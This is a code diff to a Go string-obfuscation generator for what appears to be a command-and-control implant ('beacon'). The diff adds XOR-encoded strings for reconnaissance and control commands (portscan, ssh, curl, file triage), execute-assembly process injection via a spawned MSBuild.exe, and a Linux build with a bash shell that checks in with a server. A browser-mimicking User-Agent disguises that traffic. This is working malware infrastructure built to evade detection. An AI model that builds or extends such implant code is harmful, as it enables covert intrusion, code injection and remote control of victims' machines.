@@ -32,6 +32,7 @@ var baseEntries = []entry{
 	{"CONTENT_TYPE",     "Content-Type: application/octet-stream",                  true},
 	{"SHELL_PREFIX",     "shell ",                                                   false},
 	{"CMD_WHOAMI",       "whoami",                                                   false},
+	{"CMD_ID",           "id",                                                       false},
 	{"CMD_HOSTNAME",     "hostname",                                                 false},
 	{"CMD_DOMAIN",       "domain",                                                   false},
 	{"CMD_GETPID",       "getpid",                                                   false},
@@ -42,8 +43,10 @@ var baseEntries = []entry{
 	{"CMD_GETENV",       "getenv ",                                                  false},
 	{"CMD_PWD",          "pwd",                                                      false},
 	{"CMD_CD",           "cd",                                                       false},
+	{"CMD_CD_BARE",      "cd",                                                       false},
 	{"CMD_CD_SP",        "cd ",                                                      false},
 	{"CMD_LS",           "ls",                                                       false},
+	{"CMD_LS_BARE",      "ls",                                                       false},
 	{"CMD_LS_SP",        "ls ",                                                      false},
 	{"CMD_DIR",          "dir",                                                      false},
 	{"CMD_DIR_SP",       "dir ",                                                     false},
@@ -54,9 +57,16 @@ var baseEntries = []entry{
 	{"CMD_RMDIR",        "rmdir ",                                                   false},
 	{"CMD_CP",           "cp ",                                                      false},
 	{"CMD_MV",           "mv ",                                                      false},
+	{"CMD_CHMOD",        "chmod ",                                                   false},
+	{"CMD_PORTSCAN",     "portscan ",                                                false},
+	{"CMD_CURL",         "curl ",                                                    false},
+	{"CMD_SSH",          "ssh ",                                                     false},
+	{"CMD_TRIAGE",       "triagedirectory",                                          false},
+	{"CMD_TRIAGE_SP",    "triagedirectory ",                                         false},
 	{"CMD_PS",           "ps",                                                       false},
 	{"CMD_KILL",         "kill ",                                                    false},
 	{"CMD_IPCONFIG",     "ipconfig",                                                 false},
+	{"CMD_IFCONFIG",     "ifconfig",                                                 false},
 	{"CMD_ARP",          "arp",                                                      false},
 	{"CMD_NETSTAT",      "netstat",                                                  false},
 	{"CMD_DNS",          "dns ",                                                     false},
@@ -93,6 +103,14 @@ var baseEntries = []entry{
 	{"LS_ERR_ACCESS",    "ls: cannot access '%s' (error %lu)\r\n",                  false},
 	{"LS_TAG_DIR",       "<DIR>  ",                                                  false},
 	{"LS_TAG_FILE",      "       ",                                                  false},
+
+	/* filebrowser */
+	{"CMD_FILEBROWSER",  "filebrowser ",                                             false},
+	{"CMD_FILEBROWSER_BARE", "filebrowser",                                          false},
+	{"FB_ERR",           "[{\"error\":\"cannot open '%s' (error %lu)\"}]",           false},
+	{"FB_ENTRY",         "{\"name\":\"%s\",\"type\":\"%s\",\"attrs\":\"%s\",\"size\":%llu,\"mtime\":\"%04u-%02u-%02uT%02u:%02u:%02u\"}", false},
+	{"FB_TYPE_DIR",      "dir",                                                      false},
+	{"FB_TYPE_FILE",     "file",                                                     false},
 
 	/* ps */
 	{"PS_ERR_SNAP",      "ps: snapshot failed (error %lu)\r\n",                     false},
@@ -290,6 +308,12 @@ var baseEntries = []entry{
 	{"CRYPTO_AES_CBC",     "aes-cbc",          false},
 	{"CRYPTO_HMAC_SHA256", "hmac-sha256",       false},
 
+	/* BCrypt algorithm strings (wide, replace SDK macros) */
+	{"BCRYPT_SHA256",          "SHA256",           true},
+	{"BCRYPT_AES",             "AES",              true},
+	{"BCRYPT_CHAIN_MODE",      "ChainingMode",     true},
+	{"BCRYPT_CHAIN_MODE_VAL",  "ChainingModeCBC",  true},
+
 	/* exec / runas */
 	{"FMT_PID_EXIT",       "pid=%lu exit=%lu",  false},
 
@@ -304,6 +328,21 @@ var baseEntries = []entry{
 
 	/* DLL extension for forward-export resolution */
 	{"DLL_EXT", ".dll", false},
+
+	// execute-assembly
+	{"EXEC_ASM_SPAWNTO",    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe", false},
+	{"EXEC_ASM_ERR_PIPE",   "exec-asm: pipe creation failed\r\n",                    false},
+	{"EXEC_ASM_ERR_PROC",   "exec-asm: process creation failed\r\n",                 false},
+	{"EXEC_ASM_ERR_INJECT", "exec-asm: injection failed\r\n",                        false},
+	{"EXEC_ASM_ERR_THREAD", "exec-asm: thread creation failed\r\n",                  false},
+	{"EXEC_ASM_TIMEOUT",    "exec-asm: timeout (120s)\r\n",                          false},
+
+	/* Linux session/shell */
+	{name: "BIN_BASH",      plain: "/bin/bash",     isWide: false},
+	{name: "BIN_SH",        plain: "/bin/sh",       isWide: false},
+	{name: "SHELL_STARTED", plain: "shell started", isWide: false},
+	{name: "SHELL_EXITED",  plain: "shell exited",  isWide: false},
+	{name: "UNKNOWN_TASK",  plain: "unknown task",  isWide: false},
 }
 
 // EncodeNarrow XOR-encodes a narrow (ASCII/UTF-8) string.
@@ -344,24 +383,81 @@ func DecodeWide(enc []byte, wlen int) string {
 	return string(utf16.Decode(u16))
 }
 
+// linuxRequiredEntries lists entries needed by the Linux beacon.
+// All other entries are skipped when platform == "linux".
+var linuxRequiredEntries = map[string]bool{
+	"SERVER_HOST":        true,
+	"USER_AGENT":         true,
+	"PATH_PUBKEY":        true,
+	"PATH_REGISTER":      true,
+	"PATH_CHECKIN":       true,
+	"PATH_RESULT":        true,
+	"CONTENT_TYPE":       true,
+	"HTTP_POST":          true,
+	"HTTP_GET":           true,
+	"CRYPTO_AES_CBC":     true,
+	"CRYPTO_HMAC_SHA256": true,
+	"BIN_BASH":           true,
+	"BIN_SH":             true,
+	"SHELL_STARTED":      true,
+	"SHELL_EXITED":       true,
+	"UNKNOWN_TASK":       true,
+
+	/* builtin command names */
+	"CMD_WHOAMI": true, "CMD_ID": true, "CMD_HOSTNAME": true,
+	"CMD_PWD": true, "CMD_ENV": true, "CMD_PS": true,
+	"CMD_IPCONFIG": true, "CMD_IFCONFIG": true, "CMD_NETSTAT": true,
+	"CMD_LS": true, "CMD_LS_BARE": true,
+	"CMD_CD": true, "CMD_CD_BARE": true,
+	"CMD_CAT": true, "CMD_MKDIR": true, "CMD_RM": true,
+	"CMD_CP": true, "CMD_MV": true, "CMD_CHMOD": true,
+	"CMD_GETENV": true, "CMD_KILL": true,
+	"CMD_PORTSCAN": true, "CMD_CURL": true, "CMD_SSH": true,
+	"CMD_TRIAGE": true, "CMD_TRIAGE_SP": true,
+	"SHELL_PREFIX": true,
+}
+
+const linuxUserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+const linuxContentType = "application/octet-stream"
+
 // Generate writes beacon/include/obf_strings.h to outDir.
 // host is substituted for the SERVER_HOST entry.
-func Generate(host, outDir string) error {
+// platform: "windows" (default), "linux". Linux builds use a subset of
+// entries, all narrow (no wide strings), with a Linux User-Agent.
+func Generate(host, outDir, platform string) error {
 	if host == "" {
 		return fmt.Errorf("obfgen.Generate: host must not be empty")
+	}
+	if platform == "" {
+		platform = "windows"
 	}
 	var sb strings.Builder
 	sb.WriteString("/* AUTO-GENERATED by gen_obf — DO NOT EDIT */\n#pragma once\n\n")
 
 	for _, e := range baseEntries {
+		if platform == "linux" && !linuxRequiredEntries[e.name] {
+			continue
+		}
+
 		plain := e.plain
+		isWide := e.isWide
 		if e.name == "SERVER_HOST" {
 			plain = host
 		}
 
+		if platform == "linux" {
+			isWide = false
+			if e.name == "USER_AGENT" {
+				plain = linuxUserAgent
+			}
+			if e.name == "CONTENT_TYPE" {
+				plain = linuxContentType
+			}
+		}
+
 		var enc []byte
 		var length int
-		if e.isWide {
+		if isWide {
 			enc, length = EncodeWide(plain)
 			fmt.Fprintf(&sb, "/* %s (wide): L\"%s\" */\n", e.name, plain)
 		} else {
